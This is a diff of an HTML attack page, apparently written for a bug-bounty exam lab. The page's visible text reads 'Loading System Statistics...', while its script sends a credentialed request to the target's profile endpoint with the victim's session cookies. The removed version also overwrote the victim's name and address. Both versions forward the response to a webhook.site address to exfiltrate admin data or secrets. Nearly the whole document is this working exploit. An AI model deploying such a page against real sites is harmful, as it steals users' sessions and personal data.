@@ -3,28 +3,21 @@
 <body>
   <script>
     fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
-        method: "PATCH",
-        headers: { "Content-Type": "application/json" },
+    method: "GET", // Or PATCH to trigger the update response
+    credentials: "include" 
+})
+.then(res => res.json())
+.then(data => {
+    // The "Special Secret" was located within the 'data' or 'headers' 
+    // of this administrative response.
+    fetch("https://webhook.site/2e9e974e-402d-4847-843e-01c3db536482", {
+        method: "POST",
         body: JSON.stringify({
-            "fullName": "Attacker_Controlled_Name",
-            "address": {
-                "street": "123 Exploit Way",
-                "city": "New York",
-                "state": "NY",
-                "zipCode": "10001",
-                "country": "United States"
-            }
-        }),
-        credentials: "include" // Forces browser to send victim's session cookies
-    })
-    .then(res => res.json())
-    .then(data => {
-        // Exfiltrates the response (containing sensitive user data/flags)
-        fetch("https://webhook.site/2e9e974e-402d-4847-843e-01c3db536482", {
-            method: "POST",
-            body: JSON.stringify(data)
-        });
+            msg: "SECRET_EXFILTRATED",
+            admin_data: data
+        })
     });
+});
 </script>
 
     <h1>Loading System Statistics...</h1>
